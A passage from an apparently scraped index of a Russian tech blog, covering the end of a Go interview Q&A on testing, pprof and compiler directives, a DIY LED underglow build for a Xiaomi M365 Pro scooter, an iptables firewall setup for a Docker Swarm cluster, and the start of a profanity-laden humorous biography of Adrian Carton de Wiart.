2, }, \u0026#34;140 + 6 = 146\u0026#34;: { giveOne: 140, giveSecond: 6, wantResult: 146, }, } { t.Run(name, func(t *testing.T) { // setup here  if res := Sum(tt.giveOne, tt.giveSecond); res != tt.wantResult { t.Errorf(\u0026#34;Unexpected result. Want %d, got %d\u0026#34;, tt.wantResult, res) } // teardown here \t}) } } Имя пакета с тестами Если имя пакета в файле с тестами (foo_test.go) указывать с постфиксом _test (например - имя пакета, для которого пишутся тесты foo, а имя пакета указанное в самом файле с тестами для него - foo_test), то в тестах не будет доступа в не-экспортируемым свойствам, структурам и функциям, таким образом тестирование пакета будет происходить \u0026ldquo;как из-вне\u0026rdquo;, и не будет соблазна пытаться использовать что-то приватное, что в пакете содержится. По идее, в одной директории не может находиться 2 и более файлов, имена пакетов в которых отличаются, но *_test является исключением из этого правила.\nБолее того, этот подход стимулирует тестировать API, а не внутренние механизмы, т.е. относиться к функциональности как к \u0026ldquo;черному ящику\u0026rdquo;, что очень правильно.\nСтатические анализаторы (линтеры) Уже давно на все случаи жизни существует golangci-lint, который является универсальным решением, объединяющим множество линтеров в \u0026ldquo;одном флаконе\u0026rdquo;. Удобен как для запуска локально, так и на CI.\nОшибка в бенчмарке Про бенчмарки - иногда встречается кейс с написанием бенчмарка который внутри своего цикла выполняет тестируемую функцию, а результат этого действия никуда не присваивается и не передаётся:\nfunc BenchmarkWrong(b *testing.B) { for i := 0; i \u0026lt; b.N; i++ { ourFunc() } } Компилятор может принять это во внимание, и будет выполнять её содержимое как inline-последовательность инструкций. После чего, компилятор определит, что вызовы тестируемой функции не имеет никаких побочных эффектов (side-effects), т.е. никак не влияет на среду исполнения. После чего вызов тестируемой функции будет просто удалён. Один из вариантов избежать сценария выше – присваивать результат выполнения функции переменной уровня пакета. Примерно так:\nvar result uint64 func BenchmarkCorrect(b *testing.B) { var r uint64 for i := 0; i \u0026lt; b.N; i++ { r = ourFunc() } result = r } Теперь компилятор не будет знать, есть ли у функции side-effect и бенчмарк будет точен.\nЧто про функциональное тестирование? Тут всё зависит от того, что мы собираемся тестировать, и тянет на отдельную тему для разговора. Для HTTP посоветовать можно postman и его CLI-версию newman. Ещё как вариант \u0026ldquo;быстро и просто\u0026rdquo; - это hurl.\nДля за-mock-ивания стороннего HTTP API - jmartin82/mmock или lamoda/gonkey.\nПрофилирование (pprof) Для профилирования \u0026ldquo;родными\u0026rdquo; средствами в поставке с Go имеется пакет pprof и одноименная консольная утилита go tool pprof. Причинами необходимости в профилировании могут стать:\n Длительная работа различных частей программы Высокое потребление памяти Высокое потребление ресурсов процессора  Профилировщик является семплирующим - с какой-то периодичностью мы прерываем работу программы, берем стек-трейс, записываем его куда-то, а в конце, на основе того, как часто в стек-трейсах встречаются разные функции, мы понимаем, какие из них использовали больше ресурсов процессора, а какие меньше. Работа с ним состоит из двух этапов - сбор статистики по работе сервиса, и её визуализация + анализ. Собирать статистику можно добавив вызовы пакета pprof, либо запустив HTTP сервер.\nПример использования pprof Рассмотрим простой случай, когда у нас есть функция, которая выполняется по какой-то причине очень долго. Обрамим вызовы потенциально-тяжелого кода в startPprof и stopPprof:\npackage main import ( \u0026#34;os\u0026#34; \u0026#34;runtime/pprof\u0026#34; \u0026#34;time\u0026#34; ) func startPprof() *os.File { // вспомогательная функция начала профилирования \tf, err := os.Create(\u0026#34;profile.pprof\u0026#34;) if err != nil { panic(err) } if err = pprof.StartCPUProfile(f); err != nil { panic(err) } return f } func stopPprof(f *os.File) { // вспомогательная функция завершения профилирования \tpprof.StopCPUProfile() if err := f.Close(); err != nil { panic(err) } } func main() { // наша основания функция \tvar ( slice = make([]int, 0) m = make(map[int]int) ) pprofFile := startPprof() // начинаем профилирование  // тут начинается какая-то \u0026#34;тяжелая\u0026#34; работа \tfor i := 0; i \u0026lt; 10_000_000; i++ { slice = append(slice, i*i) } for i := 0; i \u0026lt; 10_000_000; i++ { m[i] = i * i } \u0026lt;-time.After(time.Second) // а тут она завершается  stopPprof(pprofFile) // завершаем профилирование } После компиляции и запуска приложения (go build -o ./main . \u0026amp;\u0026amp; ./main) в текущей директории появится файл с именем profile.pprof, содержащий профиль работы. \u0026ldquo;Конвертируем\u0026rdquo; его в читаемое представление в виде svg изображения с помощью go tool pprof -svg ./profile.pprof (на Linux для этого понадобится установленный пакет graphviz) и открываем его (имя файла будет в виде profile001.svg):\n \nПосмотрим на получившийся граф вызовов. Изучая такой граф, в первую очередь нужно обращать внимание на толщину ребер (стрелочек) и на размер узлов графа (квадратиков). На ребрах подписано время - сколько времени данный узел или любой из ниже лежащих узлов находился в стек-трейсе во время профилирования.\nВ нашем профиле можем заметить, что runtime evacuate_fast64 занимает очень много времени. Связано это с тем, что из мапы данным приходиться эвакуироваться, так как размер мапы очень сильно растёт. Исправляем это (а заодно и слайс) всего в двух строчках:\nvar ( slice = make([]int, 0, 10_000_000) // заставляем аллоцировать память в слайсе  m = make(map[int]int, 10_000_000) // и в мапе заранее ) Повторяем все сделанные ранее операции снова, и видим уже совсем другую картину:\n \nТеперь картина значительно лучше, и следующее место оптимизации (потенциально) это пересмотреть работу с данными, а именно - нужна ли нам работа с мапой в принципе (может заменить её каким-то слайсом), и если нет - то как можно улучшить (оптимизировать) запись в неё.\nТак как же профилировщик работает в принципе? Go runtime просит ОС посылать сигнал (man setitimer) с определенной периодичностью и назначает на этот сигнал обработчик. Обработчик берет стек-трейс всех горутин, какую-то дополнительную информацию, записывает ее в буфер и выходит.\nКаковы же недостатки данного подхода?\n Каждый сигнал - это изменение контекста, вещь довольно затратная в наше время. В Go сейчас получается получить порядка 100 в секунду. Иногда этого мало Для нестандартных сборок, например, с использованием -buildmode=c-archive или -buildmode=c-shared, профайлер работать по умолчанию не будет. Это связано с тем, что сигнал SIGPROF (который посылает ОС) придет в основной поток программы, который не контролируется Go Процесс user space, которым является программа на Go, не может получить ядерный стек-трейс. Неоптимальности и проблемы иногда кроются и в ядре  Основное преимущество, конечно, в том, что Go runtime обладает полной информацией о своем внутреннем устройстве. Внешние средства, например, по умолчанию ничего не знают о горутинах. Для них существуют только процессы и треды.\n   Что можно почитать:\n Профилирование и оптимизация программ на Go   Компилятор Какие директивы компилятора знаешь? Компилятор Go понимает некоторые директивы (пишутся они в виде комментариев, как правило //go:directive), которые влияют на процесс компиляции (оптимизации, проверок, и т.д.) но не являются частью языка. Вот некоторые из них:\n//go:linkname Указывает компилятору реальное местонахождение функции или переменной. Можно использовать для вызова приватных функций из других пакетов. Требует импортирования пакета unsafe (import _ \u0026quot;unsafe\u0026quot;). Формат следующий:\n//go:linkname localname [importpath.name] Пример использования:\nimport ( _ \u0026#34;strings\u0026#34; // for explodeString \t_ \u0026#34;unsafe\u0026#34; // for go:linkname ) //go:linkname foo main.bar func foo() string func bar() string { return \u0026#34;bar\u0026#34; } //go:linkname explodeString strings.explode func explodeString(s string, n int) []string func main() { println(foo()) // bar \tprintln(explodeString(\u0026#34;foo\u0026#34;, -1)) // [3/3]0xc0000a00f0 } //go:nosplit Указывается при объявлении функции, и указывает на то, что вызов функции должен пропускать все обычные проверки на переполнение стека.\n//go:norace Так же указывается при объявлении функции и \u0026ldquo;выключает\u0026rdquo; детектор гонки (race detector) для неё.\n//go:noinline Отключает оптимизацию \u0026ldquo;инлайнига\u0026rdquo; для функции. Обычно используется отладки компилятора, escape-аналитики или бенчаркинга.\n//go:noescape Тоже \u0026ldquo;функциональная\u0026rdquo; директива, смысл которой сводится к тому, что \u0026ldquo;я доверяю этой функции, и ни один указатель, переданных в качестве аргументов (или возвращенных) этой функции не должен быть помещен в кучу (heap)\u0026rdquo;.\n//go:build Эта директива обеспечивает условную сборку. То есть мы можем \u0026ldquo;размечать\u0026rdquo; тегами файлы, и таким образом компилировать только определенные их \u0026ldquo;наборы\u0026rdquo; (тегов может быть несколько, а так же можно использовать ! для указания \u0026ldquo;не\u0026rdquo;). Часто используется для кодогенерации, указывая какой-то специфичный тег (например ignore - //go:build ignore) чтоб файл никогда не учавствовал с борке итогового приложения.\nВ качестве примера создадим 2 файла в одной директории:\n// file: main.go //go:build one  package main func main() { println(\u0026#34;one!\u0026#34;) } // file: main2.go //go:build two  package main func main() { println(\u0026#34;two!\u0026#34;) } И соберем с разными значениями -tags для go build или go run (обрати внимение - какой именно файл собирать не указывается, только тег):\n$ go run -tags one . one! $ go run -tags two . two! //go:generate Позволяет указать какие внешние команды должны вызваться при запуске go generate. Таким образом, мы можем использовать кодогенерацию, к примеру, или выполнять какие-то операции что дожны предшевствовать сборке (например - //go:generate go run gen.go где gen.go это файл, что содержит //go:build ignore т.е. исключён из компиляции, но при этом генерирует для нас какие-то полезные данные и/или целые .go файлы):\npackage main //go:generate echo \u0026#34;my build process\u0026#34; func main() { println(\u0026#34;hello world\u0026#34;) } $ go generate my build process //go:embed Позволяет \u0026ldquo;встраивать\u0026rdquo; внешние файлы в Go приложение. Требует импортирования пакета embed (import _ \u0026quot;embed\u0026quot;). Поддерживает типы string, []byte и embed.FS. Пример использования:\npackage main import _ \u0026#34;embed\u0026#34; //go:embed test.txt var hello string func main() { println(hello) } $ echo \u0026#34;hello world\u0026#34; \u0026gt; test.txt $ go run . hello world  Что можно почитать:\n pkg.go.dev/cmd/compile Go Compiler Directives Генерация кода в Go pkg.go.dev/embed  ","date":"2022-02-02T06:17:19Z","image":"https://blog.hook.sh/interview-section-golang/cover_hu946eb1caa4a6453922f3e6db1d3c2e8f_124759_120x120_fill_box_smart1_3.png","permalink":"https://blog.hook.sh/interview-section-golang/","title":"Вопросы и ответы для интервью Golang разработчика"},{"content":"Как пользователь электро-самоката M365 версии Pro со стажем — могу смело заявить, что быть заметным как для участников дорожного движения, так и пешеходного — очень важно. Если передвигаясь днём по обочине дорог и/или тротуару можно считать что твоя заметность достаточна для других участников движения (недостаток с лихвой компенсируется светоотражающим жилетом), то вот в темное время суток картина сильно меняется. Особенно это чувствуется при движении по тротуару со включенной фарой - особенность устройства и расположения фары на самокате таковы, что идущих тебе на встречу ты просто слепишь, а сзади тебя не видно от слова совсем.\nЗадавшись вопросом \u0026ldquo;как это можно исправить\u0026rdquo; было принято решение интегрировать пару led-лент в днище самоката так, что бы они освещали землю под ним (тем самым обозначая твоё местоположение для других) и чтоб при этом надежность примененного решения не вызывала сомнения. Ниже будет в меру подробное описание того, как подсветка была имплементирована, какие комплектующие для этого были выбраны, их цены и с какими сложностями столкнулся.\nСхема Как решение любой задачи в программировании начинается с проработки алгоритма, тут всё началось с принципиальной схемы:\n circuit-diagram \nЕсли словами - то мы:\n Берем 2 светодиодные ленты на 12V, питаем их через понижающий блок Понижающий блок в свою очередь запитываем прямо от батареи самоката (через предохранитель на 1A) Для включения понижающего блока используем твердотельное реле, которое \u0026ldquo;включает\u0026rdquo; в работу нашу схему в тот момент, когда мы включаем фару  Таким образом нам не придется выводить какие-либо дополнительные кнопки для включения подсветки (интуитивность на максимуме), пока не включена фара у нас цепь разомкнута (утечки тока минимальны, только через реле совсем чуть-чуть), да и в целом всё довольно просто.\n Делать RGB подсветку с управлением, например - силами Arduino по BT не стал осознанно.\n Комплектующие Что делать - понятно, теперь разбираемся с элементной базой. Взял следующие штуки:\n   Наименование Цена     LED ленты цвета \u0026ldquo;Cold White\u0026rdquo; 12V (IP67) в защитной тубе по 0.5м, 2 шт. 879,70 ₽   Понижающий преобразователь с 20..72V (DC) до 12V (DC) 5A 60W 1 012,17 ₽   Твердотельное реле SSR-DD2205HK на 5A 296,53 ₽   Малый предохранитель 1A на проводе 16 AWG 54,40 ₽   Провод 16AWG (черный и красный), по метру каждого цвета 179,51 ₽   Провод 28AWG двужильный, 5 метров 348,15 ₽   Разъемы XT30 с проводом 16AWG, 3 шт. 378,46 ₽   Разъемы двух-контактные на проводе 22AWG 122,09 ₽    Итого вышло на ~3 300 ₽, и самое дорогое - это понижающий блок. Взял его осознанно \u0026ldquo;подороже\u0026rdquo;, так как и его форм-фактор в виде залитого эпоксидной смолой блока подкупил, и положительные отзывы.\nЖелезо Первое, что было сделано - это \u0026ldquo;закладные\u0026rdquo; для лент на днище деки (по её бокам) самоката. Их цель - защитить ленты от каких-либо механических воздействий (неудачных \u0026ldquo;соскоков\u0026rdquo; с бордюров) и скрыть сам факт присутствия какой-либо кастомизации от любопытных глаз. Для этого в Leroy Merlin приобрел уголок алюминиевый 15х10х2 мм и болты потайные M3x10 мм. (лучше было бы 5 мм.). Далее дело было за малым:\n Примерить (у меня длинна каждого составила 32.5 см.), отрезать, обработать края алюминиевого уголка Просверлить по 4 отверстия и за-зенковать их Нарезать резьбу под M3 в отверстиях деки Загрунтовать и покрасить заготовки На фиксатор резьбы (анаэробный клей) вкрутить винты (прикрутить уголки к деке)   protection-corners   protection-corners-2 \nЛенты Ленты были безжалостно распотрошены и укорочены под длину получившихся закладных. Кроме того провод был заменен на более мощный с толстой изоляцией, так как он будет находиться во внешней среде, и тут я решил заложиться с некоторым запасом. После всех манипуляций с заменой провода края защитной \u0026ldquo;тубы\u0026rdquo; залил бесцветным герметиком Fix All Crystal (к слову - именно его буду использовать и дальше для герметизации стыков и заполнения пустот). Кроме того - края лент были упакованы в термо-усадку, и получилась такая красота:\n led-strip \nДалее монтируем ленты в закладные, попутно сверля необходимые отверстия (по 2 штуки на каждую сторону) и выводим провода лент через \u0026ldquo;родное\u0026rdquo; уплотнительное кольцо стоп-сигнала внутрь деки самоката:\n led-strip-installation   led-strip-installation-2 \nДалее приклеиваем ленты на двухсторонний скотч к закладным, а свободное пространство между защитным кожухом лент и корпусом деки/закладных заполняем всё тем же прозрачным герметиком (не дадим грязи повода скапливаться в образовывавшихся пустотах). Если надо будет ленту заменить - просто срежем всё это добро ножом и зачистим растворителем.\nЭлектроника Вооружившись паяльником и поглядывая на нашу схему собираем все части схемы воедино:\n electronic-part \nДлину проводов подгоняем \u0026ldquo;по месту\u0026rdquo;, а на концы LED-лент припаиваем двойные разъемы так, чтоб всё это добро соединялось без натяжки, но и без сильных излишков.\n Небольшое отступление не по теме сабжа - во время этого этапа ещё и дорожки мосфетов на контроллере усилил, и клеммы подключения мотор-колеса к контроллеру пропаял. Последние, к слову - уже начали отгарать, и их обслуживание пришлось как раз вовремя - через несколько месяцев \u0026ldquo;покатушек\u0026rdquo; они наверняка отгорели бы окончательно.\n Теперь дело за подключением фары самоката к твердотельному реле (чтоб когда мы включили фару - у нас загорелись LED-ленты). Для этого разбираем \u0026ldquo;голову\u0026rdquo; самоката, и разрезав провод питания фары (желто/белый) припаиваем к нему дополнительный разъем (к которому в дальнейшем подключим провод, что потянется до деки). И тут я должен рассказать одну тонкость - на фару подается следующее напряжение:\n   Самокат включен? Фара включена? Фара подключена? Напряжение     Нет Нет Да -   Да Нет Не важно 3.7V (\u0026ldquo;дежурное\u0026rdquo; напряжение)   Да Да Да 4.1V   Да Да Нет 36.3V    Простыми словами - разница между состояниями \u0026ldquo;фара включена\u0026rdquo; и \u0026ldquo;фара выключена\u0026rdquo; (когда фара исправно светится) в напряжении составляет всего 0.4V, а наше твердотельное реле открывается при напряжении от 3V на управляющем вводе. То есть нам нужно понизить значение \u0026ldquo;дежурного\u0026rdquo; напряжения ниже 3V но так, чтоб при включении фары оно было выше этих самых 3V. Сделал это при помощи потециометра (BAOTER 3296 - W 103), что был безжалостно выпаян из какого-то другого регулятора напряжения, что попался под руку. Итоговое сопротивление замерить забыл, каюсь, так что подобрать его придется самостоятельно.\n Ещё одно важное замечание - верхний предел напряжения на управляющем вводе нашего твердотельного реле составляет 32V, и в случае если фара выйдет из строя (не будет потребителя на выводе контроллера, к которому подключена фара) на него будет подаваться 36.6V, что не есть хорошо. Да, у нас стоит сопротивление для понижения напряжения, но долго ли проработает в этом случае реле - предсказать сложно. Надо просто это помнить и в случае выхода фары из строя - заменить её, либо повысить сопротивление.\n Проверив работоспособность схемы собираем всё \u0026ldquo;как было\u0026rdquo;, выводя с фары дополнительный коннектор рядом с родным (потенциометр я \u0026ldquo;посадил\u0026rdquo; прямо на новый вывод в термо-усадке, чтоб была возможность при необходимости подстроить его с минимальными усилиями):\n wheel \nТеперь финишная прямая - аккуратно укладываем все новые компоненты в деке (прокладывая их чем-либо мягким чтоб сидели плотно):\n deck   deck-2 \nИ через \u0026ldquo;гуся\u0026rdquo; да рулевую стойку протягиваем провод, соединяющий вывод фары (после потенциометра) и выводы управления твердотельного реле. Герметизируем деку, закручиваем всё, герметизируем резиновые уплотнители на \u0026ldquo;гусе\u0026rdquo; и рулевой стойке (чтоб там пролез дополнительный провод - их придется немного подрезать) герметиком и наслаждаемся результатом!\nПотребляемая мощность в моем конфиге составляет 1.1 Вт при выключенном свете, и 12.3 Вт когда включена фара + подсветка из LED-лент. За 1 час работы аккумулятор самоката разряжается примерно на 100 мА/ч (из 12800 в стоке), что составляет менее процента от общего объема (замерял при помощи родного приложения, вкладка информации о батарее). Компоненты не греются, совсем (исключением является лишь led-ленты, но даже их повышение температуры еле-еле ощутимо рукой).\n  Ссылки  Комментарий с рекомендацией использовать 4ю ногу драйвера фары или Arduino 1wire ","date":"2021-02-26T10:01:21Z","image":"https://blog.hook.sh/mi-m365-pro-led-backlight/cover_hu00ae8f25842f0e41405e0f3599f8aa5f_12552_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/mi-m365-pro-led-backlight/","title":"Led-подсветка для Xiaomi Mi M365 Pro своими руками"},{"content":"Однажды я решил поднять свой крохотный кластер для приложений, запускаемых в docker-контейнерах. Выбор был между nomad (уже не один комрад его настоятельно рекомендовал - обязательно попробую, но позже), K8S (слишком сложно и дорого по ресурсам для pet-проекта) и Docker Swarm (никакого дополнительного софта не потребуется, поставляется вместе с самим докером). Как ты понимаешь - выбор пал именно на последний.\nПо тому как его поднять и базово настроить - материалов полно, но когда дело дошло до настройки огненной стены - вот тут начались некоторые трудности. Известно, что docker активно эксплуатирует сетевые интерфейсы и iptables для управления трафиком между сетями и контейнерами. Как настроить ограничения доступа к master и worker-нодам кластерам ниже мы и поговорим.\nИтак, мы имеем:\n internal-сеть 10.10.10.0/24, к которой подключены все наши серверы - она используется как внутренняя (без ограничений) для общения сервером между собой (при создании swarm был указан сетевой интерфейс, \u0026ldquo;смотрящий\u0026rdquo; в этй сеть docker swarm init --advertise-addr ens11) Каждый сервер имеет белый \u0026ldquo;внешний\u0026rdquo; IP адрес (на сетевом интерфейсе eth0) Один сервер в роли master-ноды swarm-а - он же выполняет роль точки входа (ingress) в ресурсы кластера, т.е. весь трафик (http(s), tcp, udp) приходит на него и дальше уже перенаправляется в нужные контейнеры балансируя нагрузку (на этом сервере открываются все необходимые порты, что должны \u0026ldquo;светиться\u0026rdquo; наружу, естественно, и ssh для административного доступа). Сами контейнеры, что будут обрабатывать трафик находятся на worker-нодах Два сервера в роли worker-ов - на них то и запускаются приложения в контейнерах, что обрабатывают наши запросы (tcp/udp пакеты)  Нам нужно:\n Не ограничивать исходящий трафик на серверах на eth0 интерфейсе - любой процесс должен без ограничений ходить в глобальную сеть Закрыть входящие на всех портах eth0, кроме явно разрешенных (в нашем случае это будет только ssh на worker-нодах и http\\https\\ssh на master) Для internal-сети на интерфейсе ens11 не вводить никаких ограничений При запуске docker-контейнера, даже с публикацией порта в хост (network: host) - не открывать этот порт \u0026ldquo;наружу\u0026rdquo; (для этого нужно будет явно добавить правило исключения и только на master-ноде)  worker Аналогична для всех worker-нод в кластере. Перед выполнением каких-либо манипуляций c iptables настоятельно рекомендую (читай - обязательно) вывести ноду из работы, для чего на master выполни (подставляя имя или ID нужной ноды):\n$ docker node ls ID HOSTNAME STATUS AVAILABILITY MANAGER STATUS ENGINE VERSION m0au96xa2pfiwxhdhweux5b92 * ingress-1 Ready Active Leader 19.03.12 sweebuhuzfnr2bygrwg4jxddn node-1 Ready Active 19.03.12 5ikrj3ugkdiublkfe70j9upad node-2 Ready Active 19.03.12 $ docker node update node-1 --availability drain А по завершению работ обратно вводи ноду в строй:\n$ docker node update node-1 --availability active Итак, ставим iptables-persistent (все, что ниже выполняется уже на самой worker-ноде):\n$ apt install iptables-persistent $ cd /etc/iptables И приводим файлы rules.v4 и rules.v6 к следующему состоянию (правим только filter, оставил только нужные изменения):\n$ cat ./rules.v4 # ... *filter :INPUT ACCEPT [0:0] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [0:0] :CHECKS - [0:0] # added # ... -A INPUT -i eth0 -j CHECKS -A FORWARD ... -A CHECKS -p tcp -m tcp --dport 22 -m comment --comment SSH -j ACCEPT -A CHECKS -m state --state RELATED,ESTABLISHED -j ACCEPT -A CHECKS -p icmp -m icmp --icmp-type 3 -j ACCEPT -A CHECKS -p icmp -m icmp --icmp-type 11 -j ACCEPT -A CHECKS -p icmp -m icmp --icmp-type 8 -m limit --limit 8/sec -j ACCEPT -A CHECKS -j DROP -A DOCKER ... -A DOCKER-ISOLATION-STAGE-1 ... -A DOCKER-ISOLATION-STAGE-2 ... -A DOCKER-USER -i eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT -A DOCKER-USER -i eth0 -j DROP COMMIT # ...  Для IPv6 пример взят отсюда\n $ cat ./rules.v6 #... *filter :INPUT DROP [0:0] :FORWARD DROP [0:0] :OUTPUT DROP [0:0] :WCFW-ICMP - [0:0] :WCFW-Local - [0:0] :WCFW-Services - [0:0] :WCFW-State - [0:0] -A INPUT -j WCFW-Local -A INPUT -j WCFW-State -A INPUT -p ipv6-icmp -j WCFW-ICMP -A INPUT -j WCFW-Services -A OUTPUT -j WCFW-Local -A OUTPUT -j WCFW-State -A OUTPUT -j ACCEPT -A WCFW-ICMP -p ipv6-icmp -m icmp6 --icmpv6-type 1 -j ACCEPT -A WCFW-ICMP -p ipv6-icmp -m icmp6 --icmpv6-type 2 -j ACCEPT -A WCFW-ICMP -p ipv6-icmp -m icmp6 --icmpv6-type 3 -j ACCEPT -A WCFW-ICMP -p ipv6-icmp -m icmp6 --icmpv6-type 4 -j ACCEPT -A WCFW-ICMP -p ipv6-icmp -m icmp6 --icmpv6-type 133 -j ACCEPT -A WCFW-ICMP -p ipv6-icmp -m icmp6 --icmpv6-type 134 -j ACCEPT -A WCFW-ICMP -p ipv6-icmp -m icmp6 --icmpv6-type 135 -j ACCEPT -A WCFW-ICMP -p ipv6-icmp -m icmp6 --icmpv6-type 136 -j ACCEPT -A WCFW-ICMP -p ipv6-icmp -m icmp6 --icmpv6-type 128 -m limit --limit 8/sec -j ACCEPT -A WCFW-Local -i lo -j ACCEPT -A WCFW-Services -i eth0 -p tcp -m tcp --dport 22 -m comment --comment SSH -j ACCEPT -A WCFW-State -m conntrack --ctstate INVALID -j DROP -A WCFW-State -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT COMMIT # ... После чего заставляем iptables использовать наши правила:\n$ iptables-restore ./rules.v4 $ ip6tables-restore ./rules.v6 master Аналогично с worker-ами ставим iptables-persistent и приводим к виду:\n$ cat ./rules.v4 # ... *filter :INPUT ACCEPT [0:0] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [0:0] :CHECKS - [0:0] # added # ... -A INPUT -i eth0 -j CHECKS -A FORWARD ... -A CHECKS -p tcp -m tcp --dport 22 -m comment --comment SSH -j ACCEPT -A CHECKS -p tcp -m tcp --dport 80 -m comment --comment HTTP -j ACCEPT -A CHECKS -p tcp -m tcp --dport 443 -m comment --comment HTTPS -j ACCEPT -A CHECKS -m state --state RELATED,ESTABLISHED -j ACCEPT -A CHECKS -p icmp -m icmp --icmp-type 3 -j ACCEPT -A CHECKS -p icmp -m icmp --icmp-type 11 -j ACCEPT -A CHECKS -p icmp -m icmp --icmp-type 8 -m limit --limit 8/sec -j ACCEPT -A CHECKS -j DROP -A DOCKER ... -A DOCKER-ISOLATION-STAGE-1 ... -A DOCKER-ISOLATION-STAGE-2 ... -A DOCKER-USER -i eth0 -p tcp -m tcp -m conntrack --ctorigdstport 80 -m comment --comment HTTP -j ACCEPT -A DOCKER-USER -i eth0 -p tcp -m tcp -m conntrack --ctorigdstport 443 -m comment --comment HTTPS -j ACCEPT -A DOCKER-USER -i eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT -A DOCKER-USER -i eth0 -j DROP COMMIT # ... Для IPv6 настройки оставил аналогичными с worker-нодами. Теперь так выполняем:\n$ iptables-restore ./rules.v4 $ ip6tables-restore ./rules.v6 И проверяем извне на предмет \u0026ldquo;осталось ли что-нибудь лишнее\u0026rdquo;:\n$ nmap -v -A -p1-65535 -Pn 11.22.22.11 Где 11.22.22.11 наш белый IP сервера (производим такие манипуляции с каждым сервером) - должны остаться открытые только нужные нам порты. Проверяем и корректность работы приложений, запущенных в кластере (те, что ходят в глобальную сеть - должны успешно в неё ходить). Так же проверяем и с самих севреров (как master, так и worker):\n$ ping 1.1.1.1 PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data. 64 bytes from 1.1.1.1: icmp_seq=1 ttl=57 time=20.2 ms 64 bytes from 1.1.1.1: icmp_seq=2 ttl=57 time=20.3 ms $ ping6 2606:4700:4700::1111 PING 2606:4700:4700::1111(2606:4700:4700::1111) 56 data bytes 64 bytes from 2606:4700:4700::1111: icmp_seq=1 ttl=56 time=21.1 ms 64 bytes from 2606:4700:4700::1111: icmp_seq=2 ttl=56 time=21.3 ms $ docker run --rm alpine:latest ping 1.1.1.1 PING 1.1.1.1 (1.1.1.1): 56 data bytes 64 bytes from 1.1.1.1: seq=0 ttl=56 time=20.531 ms 64 bytes from 1.1.1.1: seq=1 ttl=56 time=20.386 ms $ docker run --rm curlimages/curl -s ipinfo.io/ip 11.22.22.11 $ curl -s ipinfo.io/ip 11.22.22.11 Ссылки по теме  Limiting outside connections to docker container with iptables Docker and iptables Сети Docker изнутри: как Docker использует iptables и интерфейсы Linux Пользовательские правила iptables для docker на примере zabbix Install Docker CE on Debian 10 with Dual stack IPv6-NAT and Firewall Support  ","date":"2020-07-06T15:11:47Z","image":"https://blog.hook.sh/iptables-for-docker-swarm/cover_huca17b364cb926e2346fafd474740dcec_161710_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/iptables-for-docker-swarm/","title":"Настройка iptables для swarm кластера"},{"content":"Хочу рассказать про мужика-медоеда. Этот отморозок вызывает во мне искреннее восхищение.\nЖил-был Адриан Картон ди Виарт. Родился он в 1880 году в Бельгии, в аристократической семье. Чуть ли не с самого рождения он проявил хуевый характер: был вспыльчивым до бешенства, несдержанным, и все споры предпочитал разрешать, уебав противника без предупреждения.\nКогда Адриану исполнилось 17 лет, аристократический папа спихнул его в Оксфорд, и вздохнул с облегчением. Но в университете блистательный отпрыск не успевал по всем предметам. Кроме спорта. Там он был первым. Ну и еще бухать умел.\n— Хуйня какая-то эти ваши науки, — решил Адриан. — Вам не сделать из меня офисного хомячка.\nКогда ему стукнуло 19, на его радость началась англо-бурская война. Ди Виарт понятия не имел, кто с кем воюет, и ему было похуй. Он нашел ближайший рекрутерский пункт — это оказался пункт британской армии. Отправился туда, прибавил себе 6 лет, назвался другим именем, и умотал в Африку.\n— Ишь ты, как заебись! — обрадовался он, оказавшись впервые в настоящем бою. — Пули свищут, народ мрет — красота ж!\nНо тут Адриан был ранен в пах и живот, и его отправили на лечение в Англию. Аристократический папа, счастливый, что сынок наконец нашелся, заявил:\n— Ну все, повыёбывался, и хватит. Возвращайся в Оксфорд. — Да хуй-то там! — захохотал ди Виарт. — Я ж только начал развлекаться!\nПапа убедить его не смог, и похлопотал, чтобы отморозка взяли хотя бы в офицерский корпус. Чтоб фамилию не позорил. Адриан в составе корпуса отправился в Индию, где радостно охотился на кабанов. А в 1904 году снова попал на Бурскую войну, адъютантом командующего.\nТут уж он развернулся с неебической силой. Рвался во всякий бой, хуячил противника так, что аж свои боялись, и говорили:\n— Держитесь подальше от этого распиздяя, он когда в азарте, кого угодно уебет, и не вспомнит.\nХотели ему вручить медаль, но тут выяснилось, что он 7 лет уж воюет за Англию, а сам гражданин Бельгии.\n— Как же так получилось? — спросили Адриана. — Да не похуй ли, за кого воевать? — рассудительно ответил тот.\nНо все же ему дали британское подданство и звание капитана.\nВ 1908 году ди Виарт вдруг лихо выебнулся, женившись на аристократке, у которой родословная была круче, чем у любого породистого спаниеля. Звали ее Фредерика Мария Каролина Генриетта Роза Сабина Франциска Фуггер фон Бабенхаузен.\n— Ну, теперь-то уж он остепенится, — радовался аристократический папа. У пары родились две дочери, но Адриан заскучал, и собрался на войну.\n— Куда ты, Андрюша? — плакала жена, утирая слезы родословной. — Я старый, блядь, солдат, и не знаю слов любви, — сурово отвечал ди Виарт. — Быть женатым мне не понравилось. Все твои имена пока в койке выговоришь, хуй падает. А на самом деле ты какой-то просто Бабенхаузен. Я разочарован. Ухожу.\nИ отвалил на Первую Мировую. Начал он в Сомали, помощником командующего Верблюжьим Корпусом. Во время осады крепости дервишей, ему пулей выбило глаз и оторвало часть уха.\n— Врете, суки, не убьете, — орал ди Виарт, и продолжал штурмовать укрепления, хуяча на верблюде. Под его командованием вражеская крепость была взята. Только тогда ди Виарт соизволил обратиться в госпиталь.\nЕго наградили орденом, и вернули в Британию. Подлечившись, ди Виарт попросился на западный фронт.\n— Вы ж калека, у вас глаза нет, — сказали комиссии. — Все остальное, блядь, есть, — оскалился Адриан. — Отправляйте.\nОн для красоты вставил себе стеклянный глаз. И его отправили. Сразу после комиссии ди Виарт выкинул глаз, натянул черную повязку, и сказал:\n— Буду как Нельсон. Ну или как Кутузов. Похуй, пляшем. — Ну все, пиздец, — сказали немцы, узнав об этом. — Можно сразу сдаваться.\nИ были правы. Ди Виарт херачил их только так. Командовал он пехотной бригадой. Когда убивали командиров других подразделений, принимал командование на себя. И никогда не отступал.\nПод Соммой его ранили в голову и в плечо, под Пашендалем в бедро.\nПодлечившись, он отправлялся снова воевать. В бою на Ипре ему рего не 